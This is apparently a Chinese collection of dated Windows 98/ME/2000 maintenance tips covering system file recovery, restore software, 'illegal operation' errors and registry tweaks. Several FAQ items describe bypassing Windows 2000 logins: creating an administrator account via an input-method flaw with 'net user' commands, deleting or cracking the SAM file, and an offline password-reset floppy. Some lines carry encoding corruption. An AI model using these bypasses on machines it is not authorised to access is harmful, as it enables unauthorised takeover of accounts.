£牐犔崛《ª失的系统文件:误删除系统文件(比如Vxd或者Dll文件)也是造成Win98不稳定的原因，如果知道丢失的文件名称，可以采用多种方法从Win98安装盘中提取该文件:首先应使用Win98自带的系统文件检查器，从“系统信息”程序的“工具”菜单中或者直接运行SFC命令都可启动该程序，选择“从安装软盘提取一个文件”，键入文件名称(图2)，(图)点击“开始”，继而指定Win98安装盘路径和文件释放路径，点击“确定”，选择是否备份源文件，然后该程序会自动从安装盘数十个CAB压缩包中寻找并提取该文件；如果进不了图形界面，可以在DOS下利用EXT命令，该命令需配合Extract使用，但功能更强，既可自动搜索压缩包，又可使用通配符，这一点比系统文件检查器还要方便。使用时按提示依次输入安装盘路径、提取文件名称、释放目标路径，最后按下Y键确认即可。 
£牐犎绻û自己的修补技术还不到家，那就要重视预防了，即时恢复软件将是你最好的选择。这类软件与克隆类软件原理不同，具有占据硬盘空间少、恢复速度快等优点，大家听过的超级保镖就属此类，但目前最优秀的当数瓦瑟科技推出的“即时恢复系统2001”，英文名为Pro Magic 5.12，该产品的主要特色是:1.系统即时还原，当系统紊乱时，重启就能立即还原；2.占用空间少，再多的数据也只需100MB(想想Ghost几百兆的空间占用吧)，额外备份仅需十余MB；3.操作便利、运行稳定、中文界面、分辨率可调；4.提供双重密码，加强系统安全；5.可保护CMOS资料，防止低级格式化，防止软盘启动；6.多重开机，支持22个开机盘，每个开机盘都会得到保护……安装的注意事项:Pro Magic属于商业软件，从华军可下载到957KB的共享版。安装该软件需要注意几个问题:1.关闭BIOS中的病毒防护和电源管理功能；2.保证操作系统位于硬盘第一个分区，并且分区未被Windows压缩。做好这些工作后就可进行安装了，双击Setup文件，接受版权说明，点击下一步开始安装,接下来系统会询问你是否要对硬盘执行扫描及碎片整理，如果你确信自己的硬盘没有问题的话，可以跳过此步骤。重启后Pro Magic先于Windows启动，首先会让你选择该软件运行时的显示模式，接下来让你确认硬盘分析结果是否正确，确认无误后继续输入姓名、产品序列号，最后进入Windows完成安装。安装后，在C盘根目录下，会多出一个DRVSPACE.999文件，大小为100MB。呵器械，这里记录着你的主分区信息，别把它删除了。Pro Magic的基本使用:每次开机时，该软件会自动运行，首先让你选择以用户身份还是管理者身份进入系统，按F10就可进入管理者模式，否则直接回车即可。接着出现一个菜单，共有启动、临时储存、还原、储存四个选项(图3)(图)，“启动”意味着直接进入Win98，“还原”则可从曾经储存的镜像文件中进行恢复，“临时储存”将为当前分区进行新的备份(存放在C:＼PROMAGIC路径下，大小在10MB左右)，“储存”则更新最初的备份DRVSPACE.999文件。选择启动进入Win98，该软件将会弹出窗口，提示当前是处于保护还是未保护状态，在保护状态下，你可以随意操作被保护的分区，装卸软件，甚至格式化，如果系统出现了问题，只须重启机器，在菜单中选择还原，一个完好如初的系统又展现在你的眼前了。 
£牐犎绻û你对最初的镜像不满意，可以在更改后重启时选择“储存”，如果想多储存几个镜像，可以选择“临时储存”，但这两个功能需要用户自己打开，方法是开机时进入管理者模式，左侧会出现一排按钮，将用户管理→禁用选项中的“临时储存”和“储存”设为“允许”即可。在管理者模式中有个“安装”按钮，选择它进入Win98将不受保护，所有操作都将更新最初的备份文件，还原时也就无法回到最初状态了。Pro Magic还有许多实用功能，如添加密码、CMOS保护等等，建议大家仔细阅读说明书。该软件唯一的缺点就是每次开机都要进行确认，稍嫌麻烦。 
£牐牫ý了上面提到的两种方法，克隆大法也是不少人喜欢的一剂“猛药”。克隆软件多是以簇(Cluster，是一个分区内所能分配的最小空间)为单位进行复制，所以建立的镜像文件的结构和源分区完全一样。系统损坏时，只须将该镜像文件恢复到目标硬盘或分区中，系统就能完好如初了。此类软件有Norton Ghost、Drive Image Pro等，其中以Ghost使用简便、功能丰富而应用最广。但是如果没有预先备份，那就只能用最麻烦的办法——重新安装系统来解决问题了。 
以上都是用电脑应该掌握的技巧 ， 接下来说说 win 的 非法操作问题 
在兼容机的操作过程中“非法操作”是很常见的故障现象。经过长时间的摸索和资料的搜集、整理，明白了它的成因及找到了不少对该故障的解决方法。不敢独享，特奉献给广大读者，让大家摆脱“非法操作”的困扰。 
在Windows 9x系列中，是用保护模式来管理内存的。所谓保护模式，就是由Windows 9x给每个程序分配系统资源和访问权限。这样一来，将会减少一些不必要的内存占用。但是，当某个应用程序试图侵占其他应用程序的系统资源，或是越权使用的时候，就会出现“非法操作”。“非法操作”造成的原因很复杂，不仅可以由软件问题引起，也可由硬件引起，还有病毒也来作怪。下面，将分软件及硬件两方面的原因给予介绍。 
软件方面 
1.由软件自身的不完善(BUG)引起: 
典型例子：Photoshop图形软件在运行时产生的“非法操作”。 
解决：将软件升级为高版本或升级补丁程序。如安装Windows 98的sp1就非常必要了。运行期间，应减少其他程序对内存的占用，可关闭病毒防火墙、减少剪贴板中的不必要内容。也可根据自己的情况，升级一下显卡、声卡、或是显示器的驱动程序或将它们更换成新件。 
2.由病毒感染、病毒的残留“僵尸”、冰河木马引起: 
典型例子：.DLL文件失效。 
解决：(1)在有些病毒的发作过程中，往往会伴随着一些文件的改动。一旦某些重要文件(如.sys .dll .vdx...)被改动过以后，机器会很难正常工作。方法如下：先用干净的引导盘启动微机，后用最新的杀毒软件清除病毒，再用“系统文件检查器”或者“Ext.exe”进行文件的恢复。 
(2)终止内存中正在运行的冰河木马,然后进入注册表，删除“KEY_LOCAL_MACHINE\Software\Microsoft\Windows\Current-Version\Run”和“RunServices”的键值；将“HKEY_CLASSES_ROOT\xtfileshellopenco-mmand”的键值改成“C:\Windwos\NOTE-PAD.EXE %1”；重启到DOS，再到硬盘C:\Windows\System中，将Kernel32.exe和Sysexplr.exe删除。 
3.由系统文件的损坏或丢失引起:
典型例子：Rundll32程序执行无效，即将关闭。 
解决：方法一：当按下“详细资料”按钮时，若显示：“Rundll32 caused a general protection fault in module Mmsystem.dll....”信息，原因很可能就是你的 System.ini 文件里，在[boot]这个区段中，少了：drivers =mmsystem.dll 这一行造成的。你自己补上去就可以解决了。为什么会有这个错误的发生呢？大部分都是由于在使用控制面板“添加新硬件”时，使用不正确而造成的。例如，需要你提供驱动程序而你又不能提供正确的驱动程序造成的。使用记事本，打开位于 C:\Windows 下的System.ini 文件。找到“[boot]”这个区段。补上一行“drivers=mmsystem.dll”。补上后，保存，然后重新开机。 
如果你不能确定该故障是由什么原因造成的，可以用“系统文件检查器”，在设置之中，选择“检查删除的文件” 、“检查修改过的文件”，还可以添加新的文件类型来进行检查、恢复。 
4.由软件之间的不兼容引起:
典型例子：Windows 98下的KVW3000所引起的“非法操作”。 
解决：在前面，曾讲过Windows 9x“内存管理”的概念，病毒软件运行过程中将不遵循这种方式，最终造成“非法操作”的出现。具体方法：对扫毒软件的升级，或者不用病毒防护。还可以不加载 Windows 9x的内存管理程序Emm386.exe。 
5.由缓存设置不合理引起:
典型例子：极少出现的，没有规律可循。 
解决：遵循缓存的设置规则： 
£(1)Win386.swp是Windows的“虚拟内存交换文件”，简单地说，就是拿一部分硬盘空间当作内存使用，先把一些内存中闲置太久的程序，放到硬盘上，等CPU要用的时候，再从硬盘的win386.swp里读出来。它的大小按物理内存的2倍来设置。(2)在Windows 98下，使用虚拟设备磁盘缓存Vcache。在“系统配置实用程序”中，找到sysytem.ini，再找到“[vcache]”小节，添入： MinFileCache=16384 MaxFileCache=16384 ChunkSize=512。上面的数值是以64MB为例采取的，一般原则是：物理内存×25%×512=VCache。(3)CD-ROMCache优化，注册表中“HKEY_LOCAL_MACHINE\Systm\CurrentControlSet\control\FileSystem\CDFS”，右边能看到“CacheSize”和“Prefetch”。如果你现在是使用Windows 98推荐的4倍速设置的话，它们的值应该是“0000026b”和“000000e4”，我们需要分开来修改这两个数值，我这里省略了计算方法，大家可以参考以下数据值，并根据自己的需要来修改吧，修改完后需要重新启动。 
6.由系统资源匮乏引起:
典型例子：打印或保存时引起的“非法操作”。 
解决：升级内存，加大缓存。移除一些不必要的软件，如：桌面主题、屏幕保护、计划任务、声音和输入法指示器、声卡的DOS驱动程序、防火墙、查毒软件、背景、Office 2000的竖式工具栏等等。最好是在启动微机后，先运行比较大的软件。还应加上一个良好的内存管理专家软件。 
硬件方面
1.由系统及其系统部件过热引起:
典型例子：SDRAM的过热故障。 
解决：选择好一点的散热片和散热风扇，风扇转速要高，散热片的散热面积要大，散热片材质要利于散热，与被散热部件的接触面积要大。内存的散热：现在市场上已经出现了内存的散热片，是一种长方形带圆孔的东西，但是散热体的体积过大，会影响到第二条SDRAM的插位，再就是应当注意机箱通风和不要超频。 
2.由硬件质量不好引起:
典型例子：SDRAM的质量不稳定产生的“非法操作”。 
解决：首先将BIOS中的内存参数设置得保守一些，如：SDRAM CAS LATENCY的值，设为CL=3。再就是不要超频，实在不行，只有更换内存了。 
3.由硬件I/O冲突¢熂嫒菪圆钜ý起:
典型例子：网卡的冲突。 
解决：从设备管理中，删除带“?”或带“!”的设备，让系统重新识别一下硬件后，再安装驱动程序。I/O冲突的解决：查看“设备管理器/属性”中的“ 中断请求”，若有冲突，将它进行调整即可。再就是升级一下BIOS程序，也可以解决一些问题。 
4.由硬件超频引起的“非法操作”:
典型例子：CPU和SDRAM超频故障。 
解决：首先要保证自己的硬件有良好的可超性能，再就是要将散热的危害性降到最小程度，CPU表面温度控制在50℃以内，SDRAM最好在25℃左右。 
5.由硬件损坏引起:
典型例子：包括一些接口的损坏，或者是小的电子元件被击穿。 
解决：要有专门的仪器和方法来测试，一般很少出现。这里就不多讲了。 
结论：上面讲到的，只不过是产生非法操作及解决的一些知识，它只是许多微机故障中的一个方面。下面，谈一谈为减少非法操作所应当知道的一些维护知识： 
£(1)对机房环境的维护：防尘避免高温、高湿度。 
£(2)看清故障，不要盲目处理，避免引发其他故障。 
£(3)做好接地，避免静电的危害。 
£(4)积极地吸取别人的好的建议，以增加对微机的掌握程度。 
£(5)定期地进行除尘、除湿的维护。 
£(6)注意软件版本的不断升级，以减少BUG的危害，增强功能。 
£(7)意木马冰河的防范、杀毒软件的更新。 
£(8)保持机箱的稳定性、避免不必要的振动、硬物的冲击。 
£(9)保持硬盘的数据整洁，定期运行管理软件，如：磁盘扫描、系统文件检查器、磁盘碎片整理、备份程序…… 
操作技巧与文件扩展名知识
1.win2000下的user.dmp是什么文件？
内存转储文件，系统出错时内存的映像
2.IE中的"内容"审查密码忘了怎办？
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Ratings\Key方法是先把一台已知密码的机子的IE设密码,然后纪录该键值,在这台机子上改就成了!
3.如何解锁电脑（注册表）？
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
"DisableRegistryTools"=dword:00000000
[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System]
"DisableRegistryTools"=dword:00000000
另存为1.reg然后双击
4.loadqm.exe 是什么？
Loads the MSN Explorer Query Manager的缩写，在安装完MSN后更新了注册表，此程序运行与否对使用msn没有影响
Loadqm.exe是MSN Queue Manager的一个组件，当您安装了MSN Explorer或MSN Messenger或Windows XP后就会随系统自动启动。
这个服务用于在后台进行系统所需的数据传送，如软件更新信息等，同时对这些传送进行排队和限流以不影响用户交互操作的带宽。
5.2000任务管理器中的cidaemon.exe？
cidaemon.exe > Component of Ci Filer Service 组成Ci文档服务
是索引服务的一个组成。是文件索引服务进程，你可以在搜索对话框的搜索选项下禁止索引服务
6.win2000 唯一的管理员密码忘记怎么办？
1。将硬盘拆下，安装到另一台计算机上，删除%systemroot%\system32\config\SAM
2.对原来的系统进行修复，也就是重新安装并覆盖原来的2000，这样会出现让你重新输入管理员口令的对话框，这时你就可以修改口令了，而且可以保证原来的用户信息不会丢失。
3.利用专门的工具来修改：
如：http://www.sometips.com/soft/bd010114.bin ,如果没有rawrite.exe，可以下载一个Winimage来解开该文件到软盘 
一、生成工具软盘：
　　　　1、将rawrite.exe xxxx.bin的两个文件保存到硬盘的c:\ntcrk目录；
　　　　2、准备一张质量好的软盘放入软驱，进入命令行，format a: /u /v:ntcrk 格式化
以保证该软盘没有坏区；进入c:\ntcrk目录，raw /d a: /f ntcrk.img 生成工具盘。
　　二、修改administrator的密码（不需要知道原来的密码）：
　　　　1、在有问题的系统上（你不需要拆硬盘到其他机器了），用工具软盘启动；
　　　　2、Press return/enter to continue　按回车继续；
　　　　3、Do you have your NT disks on a SCSI controller? 如果你的NT硬盘接在
SCSI卡上，请键入y后回车，否则键入n后回车，如果能检测到你的SCSI卡会显示出发现的硬盘。
　　　　4、What partition contains your NT installation? 根据列出的分区列表，输入你的NT系统所在的分区名称，其实就是SAM文件所在的分区,如：/dev/hda1，分区会MOUNT到/MNT去，可以从其他的VCRT（ALT+F2）去看，cd、ls
　　　　5、Select what you want to do:1.改密码 ----:)
　　　　6、输入SAM文件所在的路径
　　　　7、输入SAM文件名---取默认的就行
　　　　8、列出SAM中的所有用户名，输入要修改的用户名，取默认的administrator即可
　　　　9、输入新密码，如1234567890，不能不输密码
　　　　10、是否修改？当然是y了
　　　　11、还修改其他用户密码就输入要修改的用户名，否则就输!到下一步
　　　　12、Write hive file? 当然y了，否则Nothing have changed,xixi
　　　　13、About to write file back! Do it?当然y了，注意，如果你从其他VCRT进入了/以外的目录要先回到/目录。
　　　　14、恭喜你！！！如果你的运气跟我一样好。把软盘拿出来CTRL+ALT+DEL to reboot into NT,用你的新密码登录吧！ 
试试我这种方法:
用户不小心忘记了密码，造成无法登录Windows2000 时，只需用启动盘启动电脑或引导进入另一操作系统（如电脑安装有Win98与Win2000双系统），找到文件夹“X:\Documents and Settings\Administrator”（X为Windows2000所在磁盘的盘符），将此文件夹下的 “Cookies”文件夹删除，然后重新启动电脑，即可以空密码快速登录Windows2000。为安全起见，用户可重新设置各用户密码 
方法一：
以前可以用输入法漏洞：不知道你的机器是否装了sp2。
net user rinus rinus /ADD
net localgroup administrators rinus/ADD
sp2已经把这打上补丁了。 
方法2：
将硬盘摘下挂在另一台WIN2000的机子上，查看它，删掉SAM文件或者拿到本地破解！ 
方法3：
如果系统分区是fat，在DOS下删除C:\winnt\system32\config\sam*.* 文件即可获得管理员权限。登陆只要输入administrator不输密码即可。然后创建一个新的。
如果是NTFS分区的，去下载NTFSDOS,就可以用dos访问ntfs.
地址：
http://www8.pconline.com.cn/download/swdetail.phtml?id=6872 
说明如下：
NTFSDOS Pro是一个可以制作启动盘的工具，它所制作的启动盘的与众不同之处在于：虽然使用的是MS-DOS，但却可以读写NTFS格式文件系统，所有DOS命令都可以使用在NTFS格式系统上。简单的说，它包括如下功能：
?对NTFS文件系统的完全读写操作。
?MS-DOS下支持长文件名
?简单实用的启动盘制作精灵
?Windows NT/2000/XP完全兼容 
一般情况下，普通用户要想使用控制面板里的“用户和密码”工具，必须提供管理员级密码。但由于疏忽，在XP中，如果普通用户运行控制面板里的“管理工具”，则不需提供上述密码和账号。因此，他可以取得计算机管理工具的使用权，而且可以由此获得本地用户和用户组的使用权。因此也就可以获得添加用户的权力。同时他还具备更改新建用户密码的权力。当然，属于普通用户组的用户不能创建管理员级用户，也不能改变其他组用户的密码。 
　　其实，这并不是一个BUG，这只不过是一个XP缺省状态下的不安全配置而已。这一不安全的备至将有可能是计算机的管理出现混乱。要解决此问题，只要以管理员身份把Power Users组的NT AUTHORTY\INTERACTIVE项去除就可以了。 
7.改变win98录音机的录音长度限制？
1.打开录音机，安下“录音”按钮，这时在录音窗口右侧显示本次录音的长度为60秒，左侧显示本次录音的置。
2.待录音进行到一定的位置后，按下“停止”按钮。
3.打开“效果”菜单，选择“减速”，这时你会发现录音窗口右面显示长度为100秒。不断重复操作，直到录音长度增加到合适长度。
4.按“收索到开头”按钮，然后再按“录音”开始正式录音，这时候录音的长度就不是一分钟了！ 
8.给zip文件加注释？
下载的ZIP文件多了，就记不清他们都是干什么用的了，一一解开，太麻烦如果用鼠标一指它，文件的名字就出来不是很方便吗！winzip8.0就可以。举例：比如给dhyu.zip文件进行注释，首先用WINZIP8.0打开它，在工具栏展开ACTIVE（操作）菜单，选Comment（注释）项，在出现的“注释”窗口输入dhyu.zip名称，字体，窗口大小都可以调整。按:"save（保存）完毕。只要用鼠标一指它文件的名称就出来了！ 
9.让windows98更快:？
1、不要在开机时载入太多不必要的常驻程式。
2、将硬盘由FAT16转为FAT32。
3、Autoexecª眀at和Configª眘ys中什么也不要写.
4、不要使用ActiveDesktop,否则系统运行速度会因此减慢（右击屏幕→寻显示器属性”→Web标签→将其中关于“活动桌面”和“频道”的选项全部取消。）
5、选择“开始→程序→附件→系统工具→系统信息→系统信息对话框”，然后，选择“工具→系统配置实用程序→Systemª眎ni”，点选Vcache，新建Maximum=xxxx，再新建Minimum=xxxx，xxxx处请依照 内存大小换算后填入，公式为：内存数×256（2的8次方），如32M内存则填写如下：
[Vcache] Maximum=8192 Minimum=8192 注意：xxxx≤12288
10.windows me使用小技:？
1.减肥法：在“我的电脑”点右键，选“属性”依此打开“性能”“文件系统”“疑难解答”选中“禁止系统还原”点“确定”然后用DOS键入“DEL_RESTORE”回车，按“Y”重启。
2.启动优化：“开始”-“运行”—输入msconfig,回车--启动项删除*scheduingAgent,*HiberMonitor,*StateMgr,*selfHostUtil,TaskMonitor.重启动。
11.巧去“添加/删除程序”中的残留信息？
去掉“添加/删除程序”中的残留信息(用户若手工删除了应用程序，则“控制面板”中的“添加/删除程序”将会留有残留信息，此时可启动REGEDIT，依次打开“HKEY_LOCAL-MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\UNINSTALL”，则屏幕右边将显示出“添加/删除程序”中的有关项目，选中欲删除的项目“DEL”即可.) 
12.修复internet exeplorer:？
IE5出了问题，但你一时找不到问题的所在，试试IE的自我修复功能。“开始”--控制面板--添加/删除，选中“internet exeplorer,这时候，系统会问你是否修复internet exeplorer.选中它，重启动电脑即可。 
13.windows系统优化？
1，不要将C盘塞的满满的，以免影响windows的速度。
2，将windows的墙纸删掉。
3，桌面上不要放太多的图标，最好不要设屏保，这样可以可以节省更多的内存。
4，启动菜单里尽量少放启动项目，不要同时打开很多的窗口。
5，C盘最好只安装windows,其他的软件放在别的分区里。
6，机器用一段时间后在C盘里会产生垃圾碎片，我们可以将它优化。在我的电脑点右键，选“属性”点“性能”点“虚拟内存”自爱对话框里选“用户指定虚拟内存”，在硬盘的栏选硬盘（别选C盘），在最大值和最小值里添一个数字，别小于128MB。
7，DMA33模式，右键点我的电脑，属性--设备管理器--硬盘---双击----在DMA前面打对号，不理会windows提示，重启动。
14.Windows 98安装盘里的资源包？
在制作FLASH时候常会为找一些有意思的声音文件而在光盘市场里转溜吧！其实在Windows 98安装盘上就有现成的，Win98 75.CAB到Win98 80.CAB有近三百个声音文件，才10M，；而在Windows 98安装盘的WIN98 73.CAB ，WIN98 73.CAB 这个压缩包中还有桌面主题中的各种图片，这对苦于没有现成图片的制作工具的人员来讲，就不必费必寻找了。 
15.让“瘟酒吧”更稳定的小技巧？
“瘟酒吧”系统BUG多多，以致于经常发生蓝屏、VMM错误、启动时出现错误信息等问题。你可以按照以下步骤来稳定系统：首先将98安装光盘放入光驱，点击“开始”-“程序”-“附件”-“系统工具”-“系统信息”，以系统信息的工个栏里选择“系统文件检查器”，再选择“从安装软盘提取一个文件”，将以下文件提到:X:\WINDOWS\SYSTEM\ VMM32中（X为你的系统所在分区）：configmg.vxd ,ntkern.vxd,vcomm.vxd,vdd.vxd,vdmad.vxd,vflatd.vxd和vmouse.vxd文件。
16.Windows 98安装程序SETUP中的隐藏参数？
格式: setup [batch] [/ie] [/im] [/is] [/iv] [/iw] [/id] [/nr]/ie 跳过制作启动盘/im 跳过常规内存检查/is 不运行scandisk(使用新的或刚刚格式化硬盘时可用处/iv 不显示公告版(即有关Windows 98新特性介绍)/iw 跳过版权认证/nr 跳过注册表检查format的隐含参数/autotext 自动测试磁盘(即模拟格式化完毕后显示信息）/backup 同上,但有提示输入卷标/z:n 格式化后每一簇大小,n=１=512bytes,2=2×512bytes依此类推格式化时小心使用/u 执行无条件格式化,每一字均用十六帛Ｆ６覆盖无法恢复 
17.保护Windows个人密码文件一招？
熟悉WIN95/98系统的用户都知道，有关用户密码信息都存贮在Windows目录下扩展名为.pwl的文件。这里告诉你一个简单而有效的保护方法：单击“开始”，“运行”输入sysedit打开“系统配置实用程序”选中关于文件system.ini这里你会发现在其列表中有一项标题为[Password Lists]的项，这就是有关用户密码文件的链接记录，其中CYS=C:\WINDOWS\CYS.PWL（等号前的“CYS”为用户名，等号后为该用户密码文件的存放路径及文件名）知道了这点，我们就可以进行修改，以便任意指定文件。比如，你可以事先将源文件CYS。PWL改名并复制到另一目录中，如在DOS方式中执行命令:COPY C:\WINDOWS\CYS.PWL C:\WINDOWS\SYSTEM\C1.DAT.然后再将System.ini中密码文件的存放路径改为CYS=C:\WINDOWS\SYSTEM\C1.DAT。这样，就没有人再能轻松地找到你的密码文了。 
18.Windows 2000快捷运行命令？
单击“开始”菜单，打开“运行”命令框（或者用"Win+R"组合键打开），在打开的对话框中输入以下命令即可执行相应的功能drwtsn32----Dr.Watson for Windows 2000.eventvwr---事件查看器.ipsecmon--IP安全监视器.mmc---控制台.ntbackup---打开Windows2000备份及故障恢复工具.themes---打开桌面主题.wnchat---聊天功能. 
19.Windows Me安装技巧？
如果你的Windows Me因故损坏，按以下方法重新安装能大提高速度：用启动盘将系统引导至纯DOS环境，如果你的系统安装在\WINDOWS目录，可以使用进入\windows\options\install,运行其中的Setup命令开始重新安装。Windows Me之所以将安装文件放入系统目录，一方面便于添加系统组件，另一方面有利于系统故障修复。如果你的硬盘空间非常紧张，可以在安装Windows Me后将"Options"文件夹删除。然后打开注册表HKEY LOCAL MACHINE\SOFT-WARE\Microsoft\Windows\CurrentVersion\Setup分支，将"SourcePath"的值改为"E:\Windows Me\"（E是你的光驱）。以后一旦Windows Me需要某些安装文件，就会自动到光盘上找。 
20.何清除IE标题栏的恶意修改？
现在许多的个人网站站长为了片面追求访问量，使用了许多令人讨厌的方法，如强制加入收藏夹，强制设为首页。现在新的方法是修改你的注册表，将你的浏览器的标题栏加入他的网站的广告。如**网站 地址：****，很是烦人。我也受过其害，以为是中了病毒！现将解决的方法告诉大家！打开start->run->regedit，开始/运行/输入regedit 打开注册表按顺序进入HK_CURRENT_USER\software\microsoft\internet explorer\main, 然后 清除这个键值"window title" 你会看到你讨厌的广告文字在其后面，清除后关闭注册器！然后你重新打开IE,它运行默认的标题。一切ok! 
21.破解“非法操作”现象密技？
大家都遇到过这样的问题，有时候在操作windows98系统的时候，就会出现一个对话框：“该程序执行了非法操作，如果仍有问题，请与程序供应商联系”。你也曾打开过‘详细资料“但只能看到“xxxxxx在xxxx的模块导致xx错误“的信息。你可能知道应用程序内部出现了问题，但只能关闭。
windows中这种问题叫做GENERAL PROTECTION FAULT，简称GPF。打开windows的系统信息，点击“工具”下的Dr.Watson,它是一个专门诊断GPF的小程序。启动Dr.Watson,它开始收集系统信息生成快照。就会查出错误所在，关闭错误，就行了！
22.如何解除系统启动时调用的程序？
很多软件需要在计算机启动的时候运行一个程序，如“超级解霸”等。这个程序并不是加在“启动”中的，而是加入在系统的注册表里了。所以在“启动”中是看不到的。要想解除一些程序在开机后自动运行可以试着去修改一下注册表。具体方法是：选择“开始/运行”输入regedit，找到HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run目录，这个目录中所有的内容就是在计算机启动时要被执行的程序，不想要哪个删除就可以了。 
23.找找死机的原因ASD？
ASD是windows自带的一个小工具能够帮助你在启动的时候自动跳过一部分能够导致系统崩溃的驱动程序。在“开始”-运行后输入ASD，启动该程序。如果程序告诉你“这台机器没有出现严重的ASD操作失败”那么你的机器管理的不错。如果有问题的话ASD就会弹出一个窗口，列出所有失败的错误和操作。此时在程序前面的复选匡中打勾，确定。即可！ 
24.查看秘密网页？
当你在一个喜爱的站点漫游时，有没有想到过，Web站的有些内容，不是对外公开的，一般的读者无法看到这些页面。你是否想看看有哪些秘密网页呢，有一个办法，就是利用robots.txt文件。这个文件中列出了未公开页面的名称，用来告诉搜索引擎这些页面不在搜索范围之列。在浏览器地址栏中的网址后加上“/robots.txt”，你就可看到那些秘密网页的文件或文件夹列表。此后，在地址栏直接键入这些网页名，就可一睹秘密页面.---选自《红客联盟》--军人。 
25.让Realplayer从“启动”中消失？
点系统托盘区Realplayer图标，弹出的菜单中选“首选项”，在“常规”下的"StarCenter设置”中将“启用StarCenter”前的对号去掉。然后在弹出的对话框点“确定”即可。 
26.迅速查看网站更新时间？
有些站点会给你看最新更新的时间，对于没有给出更新时间的站点怎样知道更新时间呢？方法：打开该网站，在浏览器地址栏输入：javascript:alert(document.lastModified),再按回车。 
27.巧给电源风扇加油？
有些不用给风扇拆下也能加油，找一只注射器吸少许缝纫机油，在机箱背面找到电源风扇中心位置的小孔，插入针头直接注射。 
28.给注册表解锁？
如果你给注册表加密后导致自己都无法修改，可采用以下方法解锁：1.如果你对修改前的注册表文件(system.dat和user.dat)有备份，可以将它们拷到Windows目录下，覆盖对应文件即可。2.如果你没有备份，可以在DOS方式下转到Windows目录，运行scanreg/restore，选定以前某天系统对注册表的备份，直接恢复即可。 
29.Alt键的妙用？
激活菜单命令：按下Alt键可以激活活动窗口的菜单栏，使菜单栏的第一个菜单为高亮条，而按下Alt键和一个相应的字每就可以激活这个字母所代表的菜单项。快速查看属性：按下Alt+Enter组合ｚ键或按住Alt键的同时用鼠标左键双击某对象，则可快速打开其属性的对话框。切换应用程序：连续按下Alt+ESC键可以直接切换到已经运行但没有最小化的各个应用程序，而按住Alt键不放再连续按下Tab键则可以在一个对话框中显示出已经运行的所有程序的图标和当前激活的程序的图标及其名称，只要释放Alt键便可以立刻切换到该应用程序中。撤消上步操作：在Ｗin98的各对话框中，凡是对编辑的操作都可以通过Alt+Backspace键来撤消.拷贝活动窗口按下Print Screen可以拷贝当前屏幕的内容，但是按Alt+PrintScreen键则可以拷贝当前活动窗口的内容。 
30.轻松化解下载文件错误？
历经M次断线，花费N小时，用网络蚂蚁下回XX兆的文件却无法打开，真想哭都找不着调啊，不要不要悲伤，不妨看看以下两点。1.对于ZIP文件，请不要从网络蚂蚁删除下载任务，也不要移动下载的文件，打开网络蚂蚁，在下载的任务上右面击鼠标，从弹出的菜单中选“修复损坏的ZIP文件”，网络蚂蚁将对文件进行CRC校验，并标出损坏区域，然后重新下载损坏的区域。2.对于可自解压的EXE文件，不要理系统的提示，只要把后缀改为ZIP，调用WinZip打开试试。 
31.如何知道下载的文件类型？
系统可以自动隐藏文件类型的扩展名，可以在资源管理器里点击“工具”菜单，选择“文件夹选项”后再选择“查看”标签，然后把“隐藏已知文件扩展名”前的钩去掉。对于这一类的文件，实际上系统已经建立好了联系，你直接点击该文件一般都能自动运行。另外，我们一般都可以根据下载文件的内容大体上推测文件的类型：比如.EXE、ZIP、SCR等等。当然，如果你的计算机中没有打开所下载文件的应用程序，你最好在下载前稍微留心点。 
32.在DOS环幸境下创建启动盘？
我们都通过“控制面板”中的“添加/删除程序”来制作Windows 98启动盘，但在根本进入不了系统的时候又该怎么办呢？如果系统已经瘫痪无法进入Windows 98的情况下，可在开机自检启动时，按下F8键，进入MS-DOS模式，插入一张软盘进行以下操作就可以创建启动盘了： c:\>format/s/q a: c:\>copy windows\command\edb\*.* a: 复制中提示替换系文件一定要选“NO”，否则制作不成启动盘。这张启动盘含有各种磁盘工具并支持光驱，功能和前述几种方法制成的启动盘完全相同。 
33.解除屏幕保护密码（适用Windows 9X/ME/2000）？
如果你忘记了屏保密码怎么办？许多老牌的电脑高手都知道以前在Win 3.xx、Win 95、Win 95a OSR1中可同时按住Ctrl+Alt+Delete，接着再按Ctrl+Esc，这样就可从有密码的屏保中恢复到系统正常状态。不过此招在Win 95 OSR 2.x、Win 98、WinNT 4.0、Win2000中已经失灵，没关系，我们找到了新的方法，它可以完全地将屏保密码删除掉。打开注册表编辑器，找到：HKEY_USERS/.Default/Control Panel/desktop，在右边的窗口找到"ScreenSave_Data"字符串值， 选中并删除它。这样屏保密码就轻松地解除啦！ 
34.强制退出（适用Windows 9X/ME）？
如果你使用的是Win 9X/ME，那么一定会经常遇到在关机、重启时系统弹出错误信息说：某个程序还在运行，请先关闭所有程序，然后退出Windows，其实这说明某个程序此时正处于锁死状态，致使你无法退出Windows，我们一般情况下会使用“三键解决法”，也就是同时按下Alt + Ctrl + Del，然后点击结束任务来强行关闭锁死的程序，不过我们这里要告诉大家一个更好的解决办法。 打开注册表编辑器，找到：HKEY_CURRENT_USER/Control Panel/desktop，在右边的窗口中找到"AutoEndTasks"字符串，如果你的注册表中没有它，那么可以点右键-->新建-->字符串值，为它起名为： "AutoEndTasks"，双击该字符串，将其值设置为：1，这样即可打开系统的强制结束任务功能。如果你将值设置为：0，那么就是关闭该功能。 
35.活用你的IE地址栏？
IE地址栏还有许多用法供大家使用：在地址栏里输入“."即可返回主页。键入“a:”或“C”，C：windows即可返回A盘或C盘。键入“\\局域网计算机名”就可登陆到该计算机的共享文件空间。键入“mailto:ss@163.net”就可以快速打开发邮件窗口。键入“telnet://bbs.szu.edu.cn”就可以登陆BBS系统。键入“ftp://sunrise.szu.edu.cn”就可以登陆FTP系统。 
36.提高windows explore的刷新率？
当用户在“资源管理器”中增加或者删除了一个文件夹后，虽可通过按F5键查看最新刷新的结果。但是，每次这样做势必十分麻烦。通过修改注册表可以将刷新达到完全自动化。具体方法是：打开注册表编辑器，找到HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Update分支，在Update子键中包含一个名叫UpdateMode的键值名，将其键值由01改为00即可。 
37.控制IE中“自动完成”的功能？
